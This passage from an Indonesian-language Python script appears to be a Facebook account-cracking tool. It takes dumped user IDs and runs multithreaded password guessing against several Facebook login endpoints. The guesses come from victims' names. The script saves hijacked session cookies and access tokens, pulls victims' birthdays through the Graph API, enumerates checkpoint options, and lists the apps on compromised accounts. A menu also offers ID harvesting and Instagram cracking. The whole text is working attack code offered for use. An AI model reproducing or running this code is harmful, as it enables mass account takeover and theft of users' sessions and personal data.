"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"
])
# GANTI USER AGENT
def useragent():
	print ("\n%s%s%s 01 %sGanti user agent "%(U,til,P,O))
	print ("%s%s%s 02 %sCek user agent "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	_romz_ = raw_input('\n%s#%s Pilih%s >%s '%(P,O,M,K))
	uas(_romz_)
	
def uas(_romz_):
    if _romz_ == '':
        print '%s%s isi yang benar'%(M,til);jeda(2);uas(_romz_)
    elif _romz_ in("1","01"):
    	print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
    	print ("%s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
    	try:
    	    ua = raw_input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
            if ua in(""):
            	print ("%s%s isi yang benar "%(M,til));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent(romz)
            elif ua in("CANCEL","Cancel","cancel"):
            	ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
                open("data/ua.txt","w").write(ua_);jeda(2)
                print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s%s berhasil mengganti user agent"%(H,til));jeda(2);menu()
        except KeyboardInterrupt:
			exit ("\x1b[1;91m• Error ") 
    elif _romz_ in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s%s%s user agent anda : %s%s"%(U,til,O,H,ua_));jeda(2);raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif _romz_ in("0","00"):
    	menu()
    else:
        print ('%s%s isi yang benar'%(M,til));jeda(2);uas(_romz_)
# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
    def romiy(self):
        try:
            self.apk = raw_input('\n%s•%s file dump %s> %s'%(U,O,M,K))
            self.id = open(self.apk).read().splitlines()
            print ('%s•%s jumlah Id%s > %s%s' %(U,O,M,H,len(self.id)))
        except:
            print ('\n%s• File dump tidak ada, dump id dulu kentod'%(M))
            raw_input('\n%s• %s[ %senter %s] '%(U,O,U,O));menu()
        unikers = raw_input('%s•%s gunakan password manual? y/t%s > %s'%(U,O,M,K))
        if unikers in ('Y', 'y'):
            print ('\n%s•%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,O,M,O,M,O,M,O))
            while True:
                pwx = raw_input('%s•%s password %s> %s'%(U,O,M,K))
                if pwx == '':
                    print ('\n%s• jangan kosong '%(M))
                elif len(pwx)<=5:
                    print ('\n%s• password minimal 6 karakter'%(M));exit()
                else:
                    def manual(brute=None):
                        ind = raw_input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
                        if ind == '':
                            print("%s• isi yang benar kentod "%(M));manual()
                        elif ind in ('1', '01'):
                            print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
                            print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
                            print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.b_api, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("%s• finished"%(H))
                        elif ind in ('2', '02'):
                            print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
                            print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
                            print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.basic, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("%s• finished"%(H))
                        elif ind in ('3', '03'):
                            print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
                            print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
                            print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _heck_ = akun.split('<=>')[0]
                                        log.submit(self.mobil, _heck_, brute)
                                    except: pass
                            os.remove(self.apk)
                            exit("%s• finished"%(H))
                        else:
                            print ('\n%s• isi yang benar kentod'%(M));manual()
                    print ('\n%s•%s [ %spilih methode crack, silahkan coba satu² %s]\n'%(U,O,U,O))
                    print ('%s• %s01%s methode %sb-api %s(fast crack)'%(U,P,O,M,O))
                    print ('%s• %s02%s methode %smbasic %s(slow crack)'%(U,P,O,P,O))
                    print ('%s• %s03%s methode %smobile %s(very slow crack)'%(U,P,O,H,O))
                    manual(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print ('\n%s•%s [ %spilih methode crack, silahkan coba satu²%s ]\n'%(U,O,U,O))
            print ('%s• %s01%s methode %sb-api %s(fast crack)'%(U,P,O,M,O))
            print ('%s• %s02%s methode %smbasic %s(slow crack)'%(U,P,O,P,O))
            print ('%s• %s03%s methode %smobile %s(very slow crack)'%(U,P,O,H,O))
            self.langsung()
        else:
            print("%s• Isi yang benar kentod "%(M));jeda(2);menu()
    # LANGSUNG
    def langsung(self):
        suuu = raw_input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
        if suuu == '':
            print("%s• Isi yang benar kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
            print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
            print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.aapi, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("%s• finished"%(H))
        elif suuu in ('2', '02'):
            print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
            print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
            print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("%s• finished"%(H))
        elif suuu in ('3', '03'):
            print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
            print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
            print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("%s• finished"%(H))
        else:
            print("%s• Isi yang benar kentod "%(M));self.langsung()
    # API
    def b_api(self, user, manual):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000000.0,30000000.0)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	print ("\r\033[0;91m• IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                b_api(self, user, manual)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s'%(user,pw,response.json()['access_token']))
                open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
#                    cek_log(user,pw,opsi_)
                    cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
#                cek_log(user,pw,opsi_)
                cp.append('%s ◊ %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
                break
                continue
        loop += 1
        print('\r\x1b[1;95m•\x1b[1;96m [crack] %s/%s [OK:%s]-[CP:%s]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
   # MBASIC
    def basic(self, user, manual):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
#                aplikasi(berhasil,kuki)
                ok.append('%s ◊ %s ◊ %s'%(user,pw,kuki))
                open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan12[month]
                    opsi_ = '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cek_log(user,pw,opsi_)
                    cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year  = ''
                except: pass
                opsi_ = '\r %s*--> %s ◊ %s            ' % (K,user,pw)
                cek_log(user,pw,opsi_)
                cp.append('%s ◊ %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
                break
                continue

        loop += 1
        print('\r\x1b[1;95m•\x1b[1;96m [crack] %s/%s [OK:%s]-[CP:%s]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    # MOBILE
    def mobil(self, user, manual):
    	global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            try:
            	ua = open('data/ua.txt', 'r').read()
            except IOError:
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for _mi_ in b('input'):
            	if _mi_.get('value') is None:
            	    if _mi_.get('name') == 'email':
            	        data.update({"email":user})
                    elif _mi_.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({_mi_.get('name'): ''})
                else:
                	data.update({_mi_.get('name'): _mi_.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd','__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" %(key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*--> %s ◊ %s ◊ %s  '%(H,user,pw,kuki))
#                aplikasi(berhasil,kuki)
                ok.append('%s ◊ %s ◊ %s'%(user,pw,kuki))
                open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print ('\r %s*--> %s ◊ %s ◊ %s %s %s '%(K,user,pw,day,month,year))
                    cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except:pass
                print ('\r %s*--> %s ◊ %s            '%(K,user,pw))
                cp.append('%s ◊ %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
                break
                continue
                
        loop += 1
        print('\r\x1b[1;95m•\x1b[1;96m [crack] %s/%s [OK:%s]-[CP:%s]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
# OPSI CRACK 
def cek_log(user, pw, opsi_):
    ua = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for _i_ in fm.find_all("input"):
        if i.get("name") in list:
            data.update({_i_.get("name"):_i_.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pw})
    try:
        run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s• redirect overload "%(M))
    if "c_user" in ses.cookies:
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
        otw = ses.get(run,cookies={'cookie':kuki})
        gem = parser(otw.content,'html.parser')
        apk = gem.find('form',method='post')
        print("%s%s Berhasil ◊ %s "%(H,til,kuki));jeda(0.07)
        _no_ = 0
        for app in apk.find_all("h3"):
        	data = app.find('span')
        	_no_+=1
        	jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
        xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        opsi_cek = []
        for _o_ in range(len(ngew)):
            opsi_cek.append("\n  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
        print(opsi_+"".join(opsi_cek))
    elif "login_error" in str(run):
        pass
    else:
        pass
# CEK OPSI
def file_cp():
    dirs = os.listdir('CP')
    print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
    for file in dirs:
        print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
    try:
    	print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
        opsi()
    except NameError:
        print ('%s• file tidak ada'%(M));exit()
def opsi():
	CP = ("CP/")
	romi = raw_input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s isi yang benar "%(M,til));jeda(2);opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print("%s%s%s Total akun %s: %s%s"%(U,til,O,M,P,len(file_cp)));jeda(2)
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		print("\n%s%s%s cek akun %s: %s%s"%(U,til,O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n%s%s%s Selesai "%(U,til,O));jeda(0.07)
	raw_input("%s%s%s kembali "%(U,til,O));jeda(0.07)
	menu()
def mengecek(user, pw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for _i_ in fm.find_all("input"):
		if _i_.get("name") in list:
			data.update({_i_.get("name"):_i_.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pw})
	try:
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s• redirect overload "%(M))
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
		otw = ses.get(run,cookies={'cookie':kuki})
		gem = parser(otw.content,'html.parser')
		apk = gem.find('form',method='post')
		print("%s%s Berhasil ◊ %s "%(H,til,kuki));jeda(0.07)
		_no_ = 0
		for app in apk.find_all("h3"):
			data = app.find('span').text
			_no_+=1
			jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		sesi = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in sesi.find_all("option")]
		print("%s%s%s terdapat %s0%s%s opsi %s: "%(U,til,O,P,str(len(ngew)),O,M));jeda(0.07)
		for _o_ in range(len(ngew)):
			jalan("  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
	elif "login_error" in str(run):
		eror = run.find("div",{"id":"login_error"}).find("div").text
		print("%s%s %s"%(M,til,eror));jeda(0.07)
	else:
		print("%s%s login gagal, silahkan cek kembali id dan password"%(M,til));jeda(0.07)
# CEK APLIKASI
def aplikasi(berhasil,kuki):
	a = []
	run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
	otw = ses.get(run,cookies={'cookie':kuki})
	gem = parser(otw.content,'html.parser')
	apk = gem.find('form',method='post')
	_no_ = 0
	for app in apk.find_all("h3"):
		try:
			data = app.find('span').text
			_no_+=1
			a.append("  %s0%s. %s%s "%(P,str(_no_),H,data))
		except:
			pass
# MENU INI AJG
def menu():
    os.system('clear')
#    try:
#    	lic = open("data/lisensi.txt","r").read()
#        ow = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyI2NDU2MDU1IiwiRyt5aUhNQXRDM0xyZlRqMTVIVXduTFpNeWVXc3EyazdSQjY1bEI3SSJd&ProductId=13056&Key="+lic)
#        p = json.loads(ow.text)
#        k = p["licenseKey"]
#        per = k["period"]
#        join = k["created"]
#        exp = k["expires"]
#        print(" {√} api key tersedia")
#    except UnboundLocalError:
#    	print ''
#        keys()
#    except:
#    	print(" {×} api key tidak tersedia")
#        keys()
    try:
    	romz = open('data/token.txt', 'r').read()
    except IOError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
    banner()
    print ('%s # %sName %s: %s%s%s \n'%(U,O,M,H,nama,O))
    print ('%s•%s 01 %sDump id public'%(U,P,O))
    print ('%s•%s 02 %sDump id followers'%(U,P,O))
    print ('%s•%s 03 %sDump id reaction post'%(U,P,O))
    print ('%s•%s 04 %sDump id anggota groups'%(U,P,O))
    print ('%s•%s 05 %sDump id pencarian nama'%(U,P,O))
    print ('%s•%s 06 %sDump id pesan mesengger'%(U,P,O))
    print ('%s•%s 07 %sCrack facebook'%(U,P,H))
    print ('%s•%s 08 %sCrack instagram'%(U,P,H))
    print ('%s•%s 09 %sSetting user agent'%(U,P,O))
    print ('%s•%s 10 %sCek hasil crack'%(U,P,O))
    print ('%s•%s 11 %sCek opsi akun'%(U,P,O))
#    print ('%s•%s 12 %sInfo script'%(U,P,O))
    print ('%s•%s rm %sHapus akun'%(U,P,O))
    print ('%s•%s 00 %sKeluar'%(U,M,O))
    slut = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
    if slut == '':
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
    elif slut in['1','01']:
        publik(romz)
    elif slut in['2','02']:
        followers(romz)
    elif slut in['3','03']:
        postingan(romz)
    elif slut in['4','04']:
        group(__romz__())
    elif slut in['5','05']:
    	dumpfl();exit()
    elif slut in['6','06']:
    	pesan(__romz__())
    elif slut in['7','07']:
        ngentod().romiy()
    elif slut in['8','08']:
    	log_igeh()
    	menu_igeh()
    elif slut in['9','09']:
    	useragent()
    elif slut in['10']:
    	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
        print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
        cek_cek()
    elif slut in['11']:
    	file_cp()
    elif slut in['12']:
        print(ingfo)
    elif slut in['rm','Rm','RM']:
        print ('')
        tik();jeda(1);os.system('rm -rf data/token.txt && rm -rf data/cookies')
        jalan('\n%s%s berhasil terhapus '%(H,til));exit()
    elif slut in['0','00']:
    	exit('\n')
    else:
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
def menu_igeh():
	print ('\n%s•%s 01 %sCrack followers public'%(U,P,O))
	print ('%s•%s 02 %sCrack pencarian nama'%(U,P,O))
	print ('%s•%s 03 %sCek hasil crack'%(U,P,O))
	print ('%s•%s rm %sHapus akun '%(U,P,O))
	print ('%s•%s 00 %sKembali'%(U,M,O))
	romz_ = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
	if romz_ in['']:
